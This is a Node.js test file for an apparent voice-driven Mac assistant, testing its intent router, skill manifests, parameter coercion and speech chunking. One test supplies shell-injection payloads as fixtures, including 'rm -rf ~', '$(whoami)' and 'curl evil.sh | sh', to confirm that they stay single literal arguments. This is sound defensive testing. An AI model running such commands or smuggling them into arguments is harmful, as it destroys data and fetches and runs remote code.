const test = require('node:test');
const assert = require('node:assert');

const router = require('../services/router');
const skillRegistry = require('../services/skillRegistry');
const skillExecutor = require('../services/skillExecutor');

test('extractJson: parses a bare JSON object', () => {
    assert.deepEqual(router.extractJson('{"a":1}'), { a: 1 });
});

test('extractJson: strips markdown fences', () => {
    assert.deepEqual(router.extractJson('```json\n{"a":1}\n```'), { a: 1 });
});

test('extractJson: recovers an object surrounded by prose', () => {
    assert.deepEqual(router.extractJson('Sure! Here you go:\n{"a":1}\nHope that helps.'), { a: 1 });
});

test('extractJson: returns null for unparseable input', () => {
    assert.equal(router.extractJson('I cannot help with that.'), null);
});

test('extractJson: rejects a bare array', () => {
    assert.equal(router.extractJson('[1,2,3]'), null);
});


const validClassification = {
    intent_type: 'execute_existing',
    confidence: 0.9,
    reasoning: 'Matches an installed skill.',
    target_skill: 'app-launch',
    parameters: { app: 'Safari' }
};

test('validateSchema: accepts a well-formed classification', () => {
    const result = router.validateSchema(validClassification);
    assert.equal(result.valid, true, result.errors.join(','));
});

test('validateSchema: rejects an unknown intent_type', () => {
    const result = router.validateSchema({ ...validClassification, intent_type: 'do_the_thing' });
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.startsWith('invalid_enum:intent_type')));
});

test('validateSchema: rejects out-of-range confidence', () => {
    const result = router.validateSchema({ ...validClassification, confidence: 1.5 });
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.startsWith('invalid_range:confidence')));
});

test('validateSchema: reports every missing required field', () => {
    const result = router.validateSchema({});
    assert.equal(result.valid, false);
    for (const field of ['intent_type', 'confidence', 'reasoning', 'target_skill', 'parameters']) {
        assert.ok(result.errors.includes(`missing_field:${field}`), `expected missing_field:${field}`);
    }
});

test('validateSchema: rejects a hallucinated skill name', () => {
    const result = router.validateSchema({ ...validClassification, target_skill: 'not-a-real-skill' });
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.startsWith('unknown_skill:')));
});

test('validateSchema: accepts a null target_skill', () => {
    const result = router.validateSchema({
        ...validClassification, intent_type: 'generate_new_skill', target_skill: null
    });
    assert.equal(result.valid, true, result.errors.join(','));
});


const base = { ...validClassification, schema_valid: true };

test('decideAction: confident execute_existing with a skill executes', () => {
    assert.equal(router.decideAction(base), router.ACTIONS.EXECUTE);
});

test('decideAction: low confidence degrades to clarify', () => {
    assert.equal(
        router.decideAction({ ...base, confidence: router.CONFIDENCE_THRESHOLD - 0.01 }),
        router.ACTIONS.CLARIFY
    );
});

test('decideAction: refusal is honoured even at low confidence', () => {
    assert.equal(
        router.decideAction({ ...base, intent_type: 'refuse', confidence: 0.1, target_skill: null }),
        router.ACTIONS.REFUSE
    );
});

test('decideAction: invalid schema never produces an action', () => {
    assert.equal(router.decideAction({ ...base, schema_valid: false }), router.ACTIONS.CLARIFY);
});

test('decideAction: execute_existing without a skill is the generate condition', () => {
    assert.equal(router.decideAction({ ...base, target_skill: null }), router.ACTIONS.GENERATE);
});

test('decideAction: confident generate_new_skill generates', () => {
    assert.equal(
        router.decideAction({ ...base, intent_type: 'generate_new_skill', target_skill: null }),
        router.ACTIONS.GENERATE
    );
});


test('buildSystemPrompt: lists every installed skill', () => {
    const prompt = router.buildSystemPrompt(skillRegistry.list());
    for (const skill of skillRegistry.list()) {
        assert.ok(prompt.includes(skill.name), `prompt is missing ${skill.name}`);
    }
});

test('buildSystemPrompt: handles an empty catalogue', () => {
    const prompt = router.buildSystemPrompt([]);
    assert.ok(prompt.includes('no skills are currently installed'));
});


test('buildSystemPrompt: declares canonical parameter names and types', () => {
    const prompt = router.buildSystemPrompt(skillRegistry.list());
    assert.ok(prompt.includes('level:number!'), 'expected compact parameter rendering');
    assert.ok(prompt.includes('state:enum!(on|off)'), 'expected enum values inline');
});

test('buildSystemPrompt: the skill catalogue comes last, nearest the request', () => {
    const skills = skillRegistry.list();
    const prompt = router.buildSystemPrompt(skills);
    const lastSkill = skills[skills.length - 1].name;

    assert.ok(prompt.indexOf(lastSkill) > prompt.indexOf('STEP 1'),
        'the catalogue must appear after the decision procedure');
    assert.ok(prompt.trimEnd().endsWith(router.buildSystemPrompt(skills).trimEnd().slice(-40)),
        'catalogue should terminate the prompt');
});


const validManifest = {
    name: 'demo-skill',
    version: '1.0.0',
    description: 'A demo skill.',
    parameters: { target: { type: 'string', required: true } },
    exec: { type: 'command', argv: ['echo', '{{target}}'] },
    capabilities: { exec: true, filesystem: [], network: false }
};

test('validateManifest: accepts a well-formed manifest', () => {
    const r = skillRegistry.validateManifest(validManifest, 'demo-skill');
    assert.equal(r.valid, true, r.errors.join('; '));
});

test('validateManifest: rejects a name that disagrees with its directory', () => {
    const r = skillRegistry.validateManifest(validManifest, 'other-directory');
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('must match its directory')));
});

test('validateManifest: rejects a non-semver version', () => {
    const r = skillRegistry.validateManifest({ ...validManifest, version: 'v1' }, 'demo-skill');
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('semver')));
});

test('validateManifest: rejects an undeclared substitution token', () => {
    const r = skillRegistry.validateManifest(
        { ...validManifest, exec: { type: 'command', argv: ['echo', '{{nonexistent}}'] } },
        'demo-skill'
    );
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('undeclared substitution token')));
});

test('validateManifest: allows the built-in __dir__ token', () => {
    const r = skillRegistry.validateManifest(
        { ...validManifest, exec: { type: 'command', argv: ['sh', '{{__dir__}}/run.sh', '{{target}}'] } },
        'demo-skill'
    );
    assert.equal(r.valid, true, r.errors.join('; '));
});

test('validateManifest: requires an explicit capabilities declaration', () => {
    const { capabilities, ...without } = validManifest;
    const r = skillRegistry.validateManifest(without, 'demo-skill');
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('capabilities')));
});

test('validateManifest: rejects an unsupported parameter type', () => {
    const r = skillRegistry.validateManifest(
        { ...validManifest, parameters: { target: { type: 'datetime' } } },
        'demo-skill'
    );
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('unsupported type')));
});

test('every shipped skill passes validation', () => {
    assert.equal(skillRegistry.errors().length, 0,
        'rejected: ' + JSON.stringify(skillRegistry.errors()));
    assert.ok(skillRegistry.list().length >= 8);
});


const brightness = () => skillRegistry.get('display-brightness');

test('coerceParameters: resolves the names the router actually emits', () => {
    const r = skillExecutor.coerceParameters(brightness(), { brightness_level: 50 });
    assert.equal(r.valid, true, r.errors.join('; '));
    assert.equal(r.parameters.level, 0.5);
});

test('coerceParameters: accepts the canonical name', () => {
    assert.equal(skillExecutor.coerceParameters(brightness(), { level: 0.8 }).parameters.level, 0.8);
});

test('coerceParameters: maps vocabulary words to values', () => {
    assert.equal(skillExecutor.coerceParameters(brightness(), { level: 'max' }).parameters.level, 1.0);
    assert.equal(skillExecutor.coerceParameters(brightness(), { level: 'low' }).parameters.level, 0.2);
});

test('coerceParameters: rescales percentages', () => {
    assert.equal(skillExecutor.coerceParameters(brightness(), { level: '75%' }).parameters.level, 0.75);
});

test('coerceParameters: reports a missing required parameter', () => {
    const r = skillExecutor.coerceParameters(brightness(), {});
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('required')));
});

test('coerceParameters: rejects an out-of-range value', () => {
    const r = skillExecutor.coerceParameters(brightness(), { level: 500 });
    assert.equal(r.valid, false);
    assert.ok(r.errors.some(e => e.includes('exceeds the maximum')));
});

test('coerceParameters: rejects a non-numeric value', () => {
    const r = skillExecutor.coerceParameters(brightness(), { level: 'banana' });
    assert.equal(r.valid, false);
});

test('coerceParameters: coerces boolean vocabulary', () => {
    const mute = skillRegistry.get('system-mute');
    assert.equal(skillExecutor.coerceParameters(mute, { mute: 'on' }).parameters.muted, true);
    assert.equal(skillExecutor.coerceParameters(mute, { muted: 'disable' }).parameters.muted, false);
});

test('coerceParameters: constrains enum values', () => {
    const wifi = skillRegistry.get('wifi-toggle');
    assert.equal(skillExecutor.coerceParameters(wifi, { state: 'on' }).parameters.state, 'on');
    assert.equal(skillExecutor.coerceParameters(wifi, { state: 'enable' }).parameters.state, 'on');
    assert.equal(skillExecutor.coerceParameters(wifi, { state: 'sideways' }).valid, false);
});


test('buildArgv: keeps a shell-metacharacter payload as one literal argument', () => {
    const launch = skillRegistry.get('app-launch');
    const payloads = [
        'Safari"; rm -rf ~; echo "',
        'Safari$(whoami)',
        'Safari`id`',
        'Safari && curl evil.sh | sh',
        'Safari\nrm -rf /'
    ];
    for (const payload of payloads) {
        const coerced = skillExecutor.coerceParameters(launch, { app_name: payload });
        const argv = skillExecutor.buildArgv(launch, coerced.parameters);
        assert.equal(argv.length, 3, `payload split argv: ${payload}`);
        assert.equal(argv[0], 'open');
        assert.equal(argv[2], payload, 'payload must survive verbatim as one argument');
    }
});

test('substitute: a value containing a token is not re-expanded', () => {
    const launch = skillRegistry.get('app-launch');
    const argv = skillExecutor.buildArgv(launch, { app: '{{__dir__}}' });
    assert.equal(argv[2], '{{__dir__}}', 'substitution must not recurse');
});


test('resolveName: recovers token-level artifacts in skill names', () => {
    assert.equal(skillRegistry.resolveName('wifi- toggle'), 'wifi-toggle');
    assert.equal(skillRegistry.resolveName('display brightness'), 'display-brightness');
    assert.equal(skillRegistry.resolveName('App_Launch'), 'app-launch');
});

test('resolveName: still refuses names with no real skill behind them', () => {
    assert.equal(skillRegistry.resolveName('definitely-not-a-skill'), null);
    assert.equal(skillRegistry.resolveName(''), null);
    assert.equal(skillRegistry.resolveName(null), null);
});

test('validateSchema: rewrites a malformed skill name to canonical form', () => {
    const parsed = { ...validClassification, target_skill: 'app- launch' };
    const result = router.validateSchema(parsed);
    assert.equal(result.valid, true, result.errors.join(','));
    assert.equal(parsed.target_skill, 'app-launch', 'name should be normalised in place');
});

test('validateSchema: treats a stringified "null" skill as no skill', () => {
    for (const literal of ['null', 'None', 'none', 'N/A', ' - ']) {
        const parsed = {
            ...validClassification,
            intent_type: 'refuse',
            reasoning: 'R6: credential theft.',
            target_skill: literal
        };
        const result = router.validateSchema(parsed);
        assert.equal(result.valid, true, `"${literal}" should normalise to null: ${result.errors.join(',')}`);
        assert.equal(parsed.target_skill, null);
    }
});

test('validateSchema: a refusal that cites no R-category is invalid', () => {
    const parsed = {
        ...validClassification,
        intent_type: 'refuse',
        reasoning: 'No installed skill covers this and it needs custom scripting.',
        target_skill: null
    };

    const result = router.validateSchema(parsed);
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.startsWith('refusal_without_category')));
});

test('validateSchema: a refusal citing any of R1-R7 passes', () => {
    for (const category of ['R1', 'R2', 'R3', 'R4', 'R5', 'R6', 'R7']) {
        const parsed = {
            ...validClassification,
            intent_type: 'refuse',
            reasoning: `${category}: this matches the category.`,
            target_skill: null
        };
        assert.equal(router.validateSchema(parsed).valid, true, `${category} should pass`);
    }
});

test('validateSchema: the citation rule applies only to refusals', () => {
    for (const intent of ['execute_existing', 'generate_new_skill', 'answer']) {
        const parsed = {
            ...validClassification,
            intent_type: intent,
            reasoning: 'No category named here.',
            target_skill: intent === 'execute_existing' ? 'app-launch' : null
        };
        assert.equal(router.validateSchema(parsed).valid, true, `${intent} should pass`);
    }
});

test('validateSchema: "answer" is a valid intent', () => {
    const parsed = {
        ...validClassification,
        intent_type: 'answer',
        reasoning: 'A question about the world, needing nothing from this Mac.',
        target_skill: null,
        parameters: {}
    };
    assert.equal(router.validateSchema(parsed).valid, true);
});

test('decideAction: "answer" maps to the answer action', () => {
    assert.equal(
        router.decideAction({
            intent_type: 'answer', confidence: 0.9, target_skill: null, schema_valid: true
        }),
        router.ACTIONS.ANSWER
    );
});

test('decideAction: a low-confidence answer still degrades to clarify', () => {
    assert.equal(
        router.decideAction({
            intent_type: 'answer', confidence: 0.2, target_skill: null, schema_valid: true
        }),
        router.ACTIONS.CLARIFY
    );
});

test('validateSchema: a real skill named like a keyword still resolves', () => {
    const parsed = { ...validClassification, target_skill: 'app-launch' };
    assert.equal(router.validateSchema(parsed).valid, true);
    assert.equal(parsed.target_skill, 'app-launch');
});


const aiPipeline = require('../services/aiPipeline');

test('chunkTextDynamically: does not split an ordinary sentence at commas', () => {
    const chunks = aiPipeline.chunkTextDynamically('Wi-Fi turned off, and Bluetooth is on.');
    assert.equal(chunks.length, 1, `expected one utterance, got ${JSON.stringify(chunks)}`);
});

test('chunkTextDynamically: splits on sentence boundaries', () => {
    const chunks = aiPipeline.chunkTextDynamically('Done. Found three files. Saved to disk.');
    assert.equal(chunks.length, 3);
});

test('chunkTextDynamically: divides an unusually long sentence', () => {
    const long = 'Found ' + Array.from({ length: 60 }, (_, i) => `file number ${i}`).join(', ') + '.';
    const chunks = aiPipeline.chunkTextDynamically(long);
    assert.ok(chunks.length > 1, 'a very long sentence should be divided');
    assert.ok(chunks.every(c => c.length <= 300), 'no chunk should be unbounded');
});

test('chunkTextDynamically: caps the number of synthesis calls', () => {
    const many = Array.from({ length: 40 }, (_, i) => `Sentence ${i}.`).join(' ');
    const chunks = aiPipeline.chunkTextDynamically(many);
    assert.ok(chunks.length <= aiPipeline.MAX_TTS_CHUNKS + 1,
        `expected at most ${aiPipeline.MAX_TTS_CHUNKS + 1}, got ${chunks.length}`);
});

test('chunkTextDynamically: empty input produces no chunks', () => {
    assert.deepEqual(aiPipeline.chunkTextDynamically(''), []);
    assert.deepEqual(aiPipeline.chunkTextDynamically('   '), []);
});


test('speakableSummary: leaves a short reply untouched', () => {
    assert.equal(aiPipeline.speakableSummary('Wi-Fi turned off.'), 'Wi-Fi turned off.');
});

test('speakableSummary: condenses a directory listing to its shape', () => {
    const listing = 'Contents of ~/Desktop:\n' +
        Array.from({ length: 47 }, (_, i) => `-rw-r--r--@ 1 user staff 660K Screenshot-${i}.png`).join('\n');

    const spoken = aiPipeline.speakableSummary(listing);
    assert.ok(spoken.length <= aiPipeline.MAX_SPOKEN_CHARS,
        `spoken reply should be bounded, got ${spoken.length} chars`);
    assert.ok(spoken.includes('47'), 'the listener should learn how many entries there were');
    assert.ok(!spoken.includes('-rw-r--r--'), 'permission bits must not be read aloud');
});

test('speakableSummary: a long single line is truncated, not recited', () => {
    const spoken = aiPipeline.speakableSummary('x'.repeat(5000));
    assert.ok(spoken.length <= aiPipeline.MAX_SPOKEN_CHARS + 30);
    assert.match(spoken, /on screen/);
});

test('chunkTextDynamically: overflow is dropped rather than merged into one utterance', () => {
    const many = Array.from({ length: 40 }, (_, i) => `Sentence number ${i}.`).join(' ');
    const chunks = aiPipeline.chunkTextDynamically(many);
    assert.ok(chunks.length <= aiPipeline.MAX_TTS_CHUNKS + 1);
    assert.ok(chunks.every(c => c.length < 300), 'no chunk should absorb the remainder');
    assert.match(chunks[chunks.length - 1], /on screen/);
});

test('decideAction: a null-like required value is a missing value, and the clarify names it', () => {
    const classification = { ...base, parameters: { app: 'null' } };
    assert.equal(router.decideAction(classification), router.ACTIONS.CLARIFY);
    assert.ok(Array.isArray(classification.missing_parameters) && classification.missing_parameters.length === 1);
    assert.match(classification.missing_parameters[0], /^app is required/);
});

test('coerceParameters: "none" and "N/A" are absent values, not strings', () => {
    const skill = skillRegistry.get('app-launch');
    for (const word of ['none', 'N/A', ' undefined ']) {
        const result = skillExecutor.coerceParameters(skill, { app: word });
        assert.equal(result.valid, false, `${word} should be missing`);
    }
});

test('the deterministic gates read the registered sentences the way the operator does', () => {
    const { GATES } = require('../services/openclawBridge');
    assert.ok(GATES.WHERE_IS.test('where is my UCL offer of admission letter'));
    assert.ok(GATES.CREDENTIAL_ASK.test('log into my Monzo account and check my balance'));
    assert.ok(!GATES.CREDENTIAL_ASK.test('check my email to see if Priya has responded'));
    assert.ok(GATES.MAIL_CHECK.test('check my email to see if Priya has responded to my last email'));
    assert.ok(!GATES.MAIL_CHECK.test('check the disk space'));
    assert.ok(GATES.ORDER_STATUS.test('has my order from Riverside Books shipped yet?'));
    assert.ok(!GATES.ORDER_STATUS.test('order me a pizza'));
    const niagara = 'what does the University of Bristol email ask me to do before departure?';
    assert.ok(GATES.MAIL_QUESTION.test(niagara) && !GATES.MAIL_MUTATION.test(niagara));
    assert.ok(GATES.MAIL_MUTATION.test('reply to Priya saying confirmed'));
    assert.ok(GATES.MAIL_MUTATION.test('email priya@example.com saying hello'));
    assert.ok(GATES.CALENDAR_WEEK.test('what have I got on my calendar this week'));
    assert.ok(!GATES.CALENDAR_WEEK.test('find out what time and where I have to go on September 10th'));
    assert.ok(GATES.OWN_MAIL_ASK.test('tell priya@example.com to meet me at Primrose Hill at 9 PM'));
    assert.ok(!GATES.OWN_MAIL_ASK.test("log into Priya's email and delete her messages"));
    assert.ok(!GATES.OWN_MAIL_ASK.test("email Priya's password to me"));
});
